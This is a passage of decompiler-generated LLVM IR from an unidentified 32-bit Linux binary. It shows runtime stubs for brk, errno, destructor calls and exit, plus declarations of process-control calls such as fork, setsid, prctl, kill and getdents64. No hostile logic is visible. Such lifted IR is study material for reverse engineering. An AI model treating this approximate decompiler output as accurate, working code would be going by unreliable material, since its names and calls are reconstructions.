  uselistorder i32 44, { 7, 5, 4, 11, 13, 12, 8, 9, 10, 0, 2, 6, 14, 15, 16, 17, 1, 3 }
  uselistorder i32 28, { 29, 26, 27, 15, 24, 25, 30, 5, 6, 12, 7, 10, 11, 8, 16, 9, 17, 18, 19, 20, 21, 23, 22, 0, 28, 1, 13, 31, 4, 14, 3, 2, 32, 33, 34 }
}

define i32 @function_80549df(i32 %arg1) local_unnamed_addr {
dec_label_pc_80549df:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80549df = load i32, i32* @ebx, align 4
  store i32 %v0_80549df, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_80549f2 = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_80549f2, i32* @global_var_8056918.246, align 8
  %v7_80549fd = icmp ult i32 %v1_80549f2, %arg1
  %v1_80549ff = icmp eq i1 %v7_80549fd, false
  br i1 %v1_80549ff, label %dec_label_pc_8054a0f, label %dec_label_pc_8054a01

dec_label_pc_8054a01:                             ; preds = %dec_label_pc_80549df
  %v1_8054a01 = call i32 @function_80526c9(i32 %v0_80549df)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8054a09 = inttoptr i32 %v1_8054a01 to i32*
  store i32 12, i32* %v1_8054a09, align 4
  %v0_8054a0f.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_8054a13.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054a0f

dec_label_pc_8054a0f:                             ; preds = %dec_label_pc_80549df, %dec_label_pc_8054a01
  %v2_8054a13 = phi i32 [ %v0_80549df, %dec_label_pc_80549df ], [ %v2_8054a13.pre, %dec_label_pc_8054a01 ]
  %v0_8054a0f = phi i32 [ 0, %dec_label_pc_80549df ], [ %v0_8054a0f.pre, %dec_label_pc_8054a01 ]
  store i32 %v2_8054a13, i32* @ebx, align 4
  ret i32 %v0_8054a0f

; uselistorder directives
  uselistorder i32 %v1_80549f2, { 1, 0 }
  uselistorder i32 12, { 124, 110, 111, 112, 113, 114, 78, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 104, 105, 106, 107, 108, 109, 140, 158, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 71, 157, 72, 115, 116, 117, 118, 119, 67, 74, 68, 75, 69, 76, 70, 77, 81, 82, 91, 92, 93, 94, 83, 95, 86, 79, 85, 87, 88, 89, 96, 80, 84, 28, 90, 97, 103, 66, 98, 100, 101, 29, 99, 30, 31, 32, 33, 120, 0, 121, 122, 123, 34, 35, 36, 37, 38, 39, 102, 1, 2, 26, 10, 9, 8, 16, 64, 21, 43, 44, 42, 17, 49, 41, 47, 48, 18, 159, 7, 45, 46, 4, 6, 40, 160, 65, 161, 165, 162, 163, 164, 50, 51, 52, 53, 19, 20, 54, 55, 56, 166, 57, 58, 59, 60, 61, 62, 63, 5, 22, 23, 11, 12, 13, 14, 15, 167, 24, 3, 25, 168, 169, 27, 73 }
  uselistorder i32* @global_var_8056918.246, { 1, 0, 2 }
  uselistorder i32 45, { 1, 3, 0, 4, 2 }
  uselistorder label %dec_label_pc_8054a0f, { 1, 0 }
}

define i32 @function_8054a15() local_unnamed_addr {
dec_label_pc_8054a15:
  %v0_8054a18 = load i32, i32* @eax, align 4
  %v1_8054a1a = sub i32 0, %v0_8054a18
  %v1_8054a1c = call i32 @function_80526c9(i32 ptrtoint (i32* @0 to i32))
  %v2_8054a21 = inttoptr i32 %v1_8054a1c to i32*
  store i32 %v1_8054a1a, i32* %v2_8054a21, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 (i32)* @function_80526c9, { 36, 35, 53, 34, 33, 45, 0, 32, 56, 31, 30, 29, 43, 42, 41, 57, 28, 27, 26, 24, 23, 22, 40, 39, 44, 3, 17, 4, 55, 54, 38, 37, 16, 52, 15, 10, 19, 18, 51, 9, 14, 13, 50, 25, 21, 49, 12, 20, 11, 8, 48, 7, 6, 47, 46, 1, 5, 2 }
  uselistorder i32* @0, { 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 1, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 3, 4, 5, 6, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 7, 8, 9, 18, 13, 16, 17, 14, 10, 11, 12, 15, 32, 33, 34, 35, 36, 37, 19, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 97, 96, 201, 95, 129, 130, 181, 182, 183, 131, 132, 128, 149, 148, 144, 145, 146, 147, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 98, 184, 185, 186, 187, 188, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 202, 203, 204, 205, 206, 207 }
}

define i32 @function_8054a30() local_unnamed_addr {
dec_label_pc_8054a30:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_8054a3c = load i32, i32* @global_var_80567a4.233, align 4
  %v10_8054a41 = icmp eq i32 %v0_8054a3c, -1
  br i1 %v10_8054a41, label %dec_label_pc_8054a52, label %dec_label_pc_8054a46.preheader

dec_label_pc_8054a46.preheader:                   ; preds = %dec_label_pc_8054a30
  br label %dec_label_pc_8054a46

dec_label_pc_8054a46:                             ; preds = %dec_label_pc_8054a46.preheader, %dec_label_pc_8054a46
  %v4_8054a49 = phi i32 [ %v0_8054a3c, %dec_label_pc_8054a46.preheader ], [ %v2_8054a4b, %dec_label_pc_8054a46 ]
  %v0_8054a46 = phi i32 [ ptrtoint (i32* @global_var_80567a4.233 to i32), %dec_label_pc_8054a46.preheader ], [ %v1_8054a46, %dec_label_pc_8054a46 ]
  %v1_8054a46 = add i32 %v0_8054a46, -4
  call void @__pseudo_call(i32 %v4_8054a49)
  %v1_8054a4b = inttoptr i32 %v1_8054a46 to i32*
  %v2_8054a4b = load i32, i32* %v1_8054a4b, align 4
  %v10_8054a4d = icmp eq i32 %v2_8054a4b, -1
  %v1_8054a50 = icmp eq i1 %v10_8054a4d, false
  br i1 %v1_8054a50, label %dec_label_pc_8054a46, label %dec_label_pc_8054a52.loopexit

dec_label_pc_8054a52.loopexit:                    ; preds = %dec_label_pc_8054a46
  %v2_8054a52.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8054a52

dec_label_pc_8054a52:                             ; preds = %dec_label_pc_8054a52.loopexit, %dec_label_pc_8054a30
  %v2_8054a52 = phi i32 [ %v2_8054a52.pre, %dec_label_pc_8054a52.loopexit ], [ %tmp6, %dec_label_pc_8054a30 ]
  ret i32 %v2_8054a52

; uselistorder directives
  uselistorder i32 %v0_8054a3c, { 1, 0 }
  uselistorder i1 false, { 125, 126, 28, 29, 31, 30, 127, 128, 129, 97, 98, 130, 133, 134, 135, 136, 137, 139, 11, 140, 141, 138, 132, 131, 25, 142, 143, 144, 1, 146, 147, 0, 148, 99, 100, 101, 102, 103, 104, 12, 149, 150, 151, 3, 152, 153, 154, 155, 2, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 156, 79, 80, 81, 82, 83, 84, 85, 86, 87, 169, 170, 171, 172, 173, 174, 175, 176, 177, 10, 179, 178, 183, 180, 181, 182, 13, 184, 185, 145, 26, 4, 27, 186, 187, 15, 105, 106, 107, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 16, 198, 108, 109, 110, 199, 200, 201, 5, 32, 6, 202, 203, 204, 35, 45, 50, 51, 36, 53, 46, 47, 48, 52, 33, 34, 37, 38, 39, 40, 41, 42, 43, 44, 49, 54, 55, 78, 76, 18, 77, 19, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 75, 70, 73, 88, 89, 90, 91, 92, 93, 94, 20, 95, 96, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 71, 72, 74, 205, 206, 207, 208, 209, 7, 211, 212, 213, 210, 214, 215, 216, 217, 218, 219, 8, 220, 221, 222, 223, 17, 224, 225, 226, 227, 228, 229, 230, 22, 21, 231, 23, 232, 233, 234, 235, 9, 24, 14, 236 }
  uselistorder void (i32)* @__pseudo_call, { 1, 3, 4, 5, 6, 2, 0 }
  uselistorder i32 -4, { 15, 16, 17, 18, 102, 103, 104, 105, 11, 106, 3, 101, 19, 97, 12, 98, 99, 100, 13, 0, 9, 10, 107, 108, 109, 110, 111, 112, 113, 14, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 7, 57, 8, 58, 59, 60, 2, 6, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 4, 5, 89, 90, 91, 92, 93, 94, 95, 1, 96 }
  uselistorder i32 ptrtoint (i32* @global_var_80567a4.233 to i32), { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 -1, { 27, 28, 0, 120, 203, 75, 121, 76, 77, 122, 78, 123, 79, 124, 80, 125, 81, 126, 82, 127, 83, 128, 84, 129, 85, 130, 25, 26, 13, 12, 86, 87, 131, 88, 132, 89, 133, 29, 1, 134, 74, 90, 91, 135, 136, 137, 15, 138, 14, 139, 93, 92, 140, 204, 17, 18, 141, 16, 142, 30, 205, 31, 143, 206, 34, 33, 35, 36, 22, 37, 94, 38, 144, 32, 207, 11, 145, 146, 116, 147, 19, 39, 2, 95, 208, 209, 96, 201, 40, 97, 148, 98, 149, 99, 150, 72, 73, 151, 100, 152, 101, 153, 102, 154, 103, 155, 104, 156, 105, 157, 106, 158, 107, 159, 108, 160, 109, 161, 110, 162, 111, 163, 112, 164, 113, 165, 114, 166, 41, 167, 168, 3, 169, 20, 4, 170, 42, 171, 115, 210, 117, 43, 172, 173, 197, 198, 174, 193, 199, 44, 175, 176, 177, 178, 194, 48, 179, 180, 181, 182, 183, 184, 47, 185, 195, 45, 46, 186, 196, 187, 188, 49, 189, 200, 5, 50, 51, 52, 53, 54, 190, 191, 23, 6, 55, 192, 21, 10, 9, 8, 7, 56, 202, 57, 58, 59, 60, 24, 61, 211, 212, 213, 62, 214, 215, 68, 63, 216, 64, 65, 66, 67, 217, 69, 218, 70, 71, 219, 220, 118, 119 }
  uselistorder i32 1, { 273, 274, 89, 159, 160, 414, 415, 416, 417, 161, 514, 275, 18, 17, 19, 276, 26, 25, 24, 277, 27, 278, 280, 279, 78, 282, 281, 45, 284, 283, 46, 285, 82, 286, 112, 287, 75, 288, 114, 289, 113, 290, 115, 291, 292, 48, 47, 49, 184, 90, 294, 293, 296, 295, 93, 297, 23, 299, 298, 73, 300, 304, 303, 302, 301, 62, 515, 516, 517, 307, 306, 305, 22, 21, 162, 308, 311, 310, 309, 116, 163, 258, 412, 146, 317, 316, 315, 314, 313, 312, 59, 60, 185, 318, 478, 479, 480, 256, 481, 319, 51, 52, 53, 50, 54, 164, 259, 322, 321, 320, 99, 186, 519, 520, 521, 323, 61, 522, 523, 165, 524, 525, 526, 67, 65, 66, 260, 518, 187, 100, 101, 102, 103, 188, 166, 452, 453, 454, 455, 326, 325, 324, 120, 119, 121, 189, 327, 63, 64, 191, 527, 528, 529, 530, 531, 532, 533, 534, 535, 190, 536, 537, 538, 539, 540, 167, 541, 542, 125, 168, 543, 544, 545, 546, 169, 170, 547, 548, 549, 329, 328, 69, 68, 70, 72, 71, 171, 172, 330, 173, 174, 192, 334, 333, 332, 331, 87, 193, 261, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 194, 195, 351, 350, 352, 175, 355, 354, 353, 94, 196, 356, 357, 57, 358, 124, 360, 359, 31, 361, 20, 362, 105, 363, 111, 365, 364, 56, 366, 55, 367, 88, 97, 369, 368, 58, 370, 91, 372, 371, 123, 374, 373, 104, 375, 122, 377, 376, 83, 378, 98, 379, 84, 74, 550, 551, 552, 553, 257, 380, 36, 32, 35, 33, 34, 37, 554, 555, 126, 127, 556, 557, 0, 558, 559, 560, 561, 562, 197, 563, 198, 564, 382, 381, 118, 482, 176, 96, 95, 565, 177, 239, 566, 567, 178, 568, 569, 199, 570, 131, 76, 77, 418, 132, 383, 80, 81, 79, 571, 572, 573, 384, 4, 5, 3, 6, 574, 575, 266, 7, 9, 8, 11, 10, 576, 267, 28, 29, 30, 421, 422, 423, 424, 425, 426, 427, 435, 436, 437, 200, 438, 428, 206, 439, 212, 431, 214, 419, 208, 430, 204, 432, 202, 433, 440, 215, 210, 420, 211, 216, 217, 429, 209, 213, 205, 203, 201, 434, 441, 218, 207, 451, 449, 450, 442, 443, 444, 445, 447, 219, 448, 107, 109, 108, 106, 110, 446, 262, 385, 117, 456, 457, 458, 459, 244, 243, 139, 128, 460, 461, 179, 137, 138, 129, 462, 463, 180, 136, 245, 247, 464, 465, 263, 466, 467, 468, 240, 241, 469, 470, 242, 248, 246, 471, 472, 473, 220, 474, 475, 476, 183, 477, 388, 387, 386, 13, 14, 15, 12, 16, 389, 268, 390, 221, 181, 264, 391, 393, 392, 483, 484, 485, 486, 487, 488, 147, 489, 490, 491, 492, 222, 493, 494, 495, 496, 158, 223, 265, 513, 224, 398, 397, 396, 395, 394, 92, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 403, 402, 269, 272, 401, 400, 270, 399, 85, 86, 1, 249, 2, 148, 149, 577, 578, 579, 580, 581, 133, 134, 582, 583, 584, 585, 586, 228, 140, 141, 227, 142, 231, 143, 587, 588, 229, 144, 145, 230, 589, 135, 130, 590, 591, 592, 593, 594, 250, 150, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 235, 157, 156, 605, 251, 151, 606, 607, 608, 609, 610, 232, 611, 612, 233, 613, 252, 152, 614, 253, 153, 615, 616, 254, 154, 617, 618, 255, 155, 619, 620, 621, 622, 623, 234, 624, 626, 627, 625, 236, 628, 629, 630, 631, 225, 226, 632, 633, 634, 635, 237, 413, 238, 636, 182, 410, 409, 408, 407, 406, 405, 404, 271, 43, 41, 40, 38, 39, 42, 44, 411 }
  uselistorder label %dec_label_pc_8054a46, { 1, 0 }
}

define i32 @function_8054a56() local_unnamed_addr {
entry:
  %v0_8054a59 = load i32, i32* @ebx, align 4
  %v1_8054a5a = call i32 @function_80480b0(i32 %v0_8054a59)
  store i32 %v1_8054a5a, i32* @eax, align 4
  %v0_8054a65 = call i32 @function_80480c0()
  ret i32 %v0_8054a65

; uselistorder directives
  uselistorder i32* @eax, { 9, 50, 51, 53, 54, 55, 56, 58, 16, 59, 1, 57, 6, 8, 52, 60, 62, 63, 61, 34, 35, 64, 70, 65, 66, 68, 69, 67, 37, 38, 17, 2, 3, 10, 24, 26, 25, 27, 31, 32, 33, 28, 29, 30, 36, 5, 18, 39, 11, 40, 41, 42, 12, 43, 0, 13, 14, 44, 45, 46, 47, 15, 71, 19, 20, 21, 72, 73, 74, 75, 76, 22, 23, 77, 48, 49, 4, 7 }
  uselistorder i32 (i32)* @function_80480b0, { 1, 0 }
  uselistorder i32 0, { 684, 70, 395, 71, 473, 474, 72, 475, 476, 477, 73, 145, 146, 584, 585, 74, 479, 685, 686, 687, 201, 688, 689, 690, 563, 586, 587, 691, 464, 463, 692, 693, 694, 465, 588, 589, 590, 591, 461, 695, 696, 697, 75, 698, 147, 703, 704, 10, 76, 396, 11, 397, 398, 706, 707, 139, 708, 77, 377, 78, 202, 203, 0, 699, 700, 701, 79, 462, 388, 80, 399, 709, 1, 148, 149, 81, 710, 711, 82, 83, 713, 712, 26, 27, 714, 717, 204, 378, 718, 720, 719, 24, 25, 721, 702, 592, 593, 594, 595, 400, 401, 53, 596, 200, 402, 150, 84, 722, 30, 379, 85, 151, 726, 729, 728, 28, 29, 732, 733, 734, 735, 736, 152, 737, 738, 739, 205, 730, 206, 731, 207, 403, 564, 64, 565, 153, 404, 566, 567, 740, 741, 742, 743, 744, 745, 746, 747, 748, 154, 155, 749, 405, 761, 406, 407, 208, 380, 408, 209, 381, 86, 409, 750, 751, 87, 88, 210, 382, 66, 752, 753, 754, 89, 90, 211, 383, 65, 755, 140, 756, 55, 757, 758, 760, 410, 759, 2, 727, 715, 716, 466, 467, 469, 468, 31, 32, 3, 156, 470, 471, 472, 478, 597, 598, 411, 412, 599, 600, 601, 602, 603, 604, 605, 606, 413, 480, 607, 762, 725, 481, 763, 608, 609, 482, 705, 67, 157, 723, 483, 610, 724, 611, 764, 484, 765, 766, 414, 767, 8, 91, 415, 768, 212, 769, 770, 158, 771, 12, 33, 56, 13, 57, 14, 772, 4, 34, 58, 15, 59, 16, 93, 92, 60, 17, 94, 95, 485, 68, 612, 613, 96, 416, 390, 773, 774, 775, 776, 777, 778, 99, 98, 97, 779, 166, 101, 100, 102, 417, 780, 137, 418, 486, 419, 420, 9, 103, 421, 61, 18, 104, 422, 105, 423, 424, 425, 489, 490, 491, 426, 159, 492, 494, 495, 496, 427, 508, 509, 510, 511, 512, 107, 108, 428, 513, 514, 497, 429, 430, 519, 520, 518, 506, 507, 487, 488, 515, 516, 517, 498, 499, 500, 501, 502, 503, 504, 505, 19, 142, 143, 138, 431, 106, 432, 521, 561, 562, 558, 559, 560, 141, 556, 557, 109, 433, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 391, 434, 534, 435, 110, 436, 536, 537, 538, 539, 540, 160, 161, 541, 542, 543, 437, 493, 551, 552, 553, 554, 544, 545, 546, 550, 555, 111, 162, 535, 112, 384, 438, 439, 392, 393, 568, 569, 47, 45, 440, 46, 44, 441, 570, 571, 572, 573, 574, 575, 576, 167, 442, 577, 578, 579, 580, 385, 443, 444, 581, 582, 69, 583, 163, 113, 175, 182, 183, 184, 173, 174, 614, 114, 35, 36, 615, 616, 617, 115, 51, 618, 619, 620, 621, 116, 50, 622, 623, 624, 625, 117, 49, 626, 627, 628, 629, 118, 48, 630, 631, 632, 176, 177, 178, 179, 180, 181, 633, 634, 171, 170, 635, 168, 7, 6, 169, 636, 172, 637, 185, 638, 186, 639, 187, 640, 188, 641, 643, 644, 645, 642, 646, 647, 189, 190, 648, 164, 649, 119, 672, 20, 62, 386, 445, 446, 447, 650, 656, 191, 651, 652, 192, 653, 193, 654, 194, 655, 39, 657, 195, 196, 658, 197, 659, 660, 198, 661, 199, 662, 663, 664, 665, 448, 666, 667, 668, 669, 38, 213, 120, 121, 449, 450, 670, 671, 52, 63, 122, 451, 37, 214, 216, 217, 452, 123, 124, 215, 387, 125, 547, 548, 549, 21, 126, 394, 22, 218, 127, 128, 673, 674, 675, 676, 677, 678, 781, 782, 679, 680, 783, 784, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 785, 786, 787, 788, 789, 790, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 43, 846, 847, 848, 849, 850, 851, 852, 129, 453, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 454, 891, 883, 884, 885, 886, 887, 888, 889, 890, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 130, 455, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 219, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 967, 966, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 131, 456, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 132, 457, 1016, 1017, 389, 1018, 1019, 458, 1020, 1021, 1022, 133, 459, 1023, 54, 1024, 23, 40, 41, 42, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 165, 134, 135, 5, 681, 682, 683, 136, 460, 144, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040 }
  uselistorder i32* @ebx, { 22, 370, 371, 231, 232, 27, 372, 2, 373, 374, 375, 376, 182, 183, 377, 24, 378, 379, 380, 381, 382, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 3, 252, 253, 254, 23, 383, 384, 385, 386, 387, 388, 389, 390, 391, 20, 21, 400, 401, 402, 403, 17, 4, 16, 394, 397, 398, 399, 392, 404, 405, 406, 407, 408, 409, 410, 411, 393, 255, 256, 420, 421, 422, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 5, 437, 438, 423, 424, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 6, 196, 197, 198, 199, 200, 201, 202, 439, 464, 465, 466, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 18, 450, 451, 452, 453, 454, 7, 455, 456, 457, 458, 459, 460, 461, 462, 463, 418, 419, 25, 26, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 28, 285, 286, 467, 468, 416, 417, 29, 469, 470, 287, 288, 289, 290, 30, 395, 396, 412, 413, 31, 291, 292, 414, 415, 293, 294, 471, 472, 32, 473, 474, 475, 33, 295, 296, 8, 297, 298, 34, 35, 476, 477, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 138, 139, 140, 156, 10, 157, 158, 159, 160, 145, 146, 161, 143, 136, 142, 144, 147, 148, 149, 137, 162, 141, 150, 151, 152, 153, 154, 155, 163, 164, 165, 166, 167, 168, 178, 179, 180, 9, 181, 169, 170, 171, 172, 173, 174, 175, 176, 177, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 11, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 299, 300, 301, 0, 302, 303, 304, 305, 306, 307, 12, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 19, 355, 356, 357, 358, 359, 360, 361, 478, 479, 480, 362, 363, 364, 365, 481, 482, 483, 484, 13, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 485, 486, 487, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 1, 517, 518, 519, 520, 521, 15, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 14, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 366, 367, 368, 369 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @chdir(i8*) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @getppid(i32) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @prctl(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32* @mmap(i32*, i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @fstat(i32, %stat*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32* @mremap(i32*, i32, i32, i32, ...) local_unnamed_addr

declare i32 @munmap(i32*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @times(%tms*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16* @__decompiler_undefined_function_4() local_unnamed_addr

declare i64 @__decompiler_undefined_function_5() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_6() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_7() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_8() local_unnamed_addr

declare %tms* @__decompiler_undefined_function_9() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
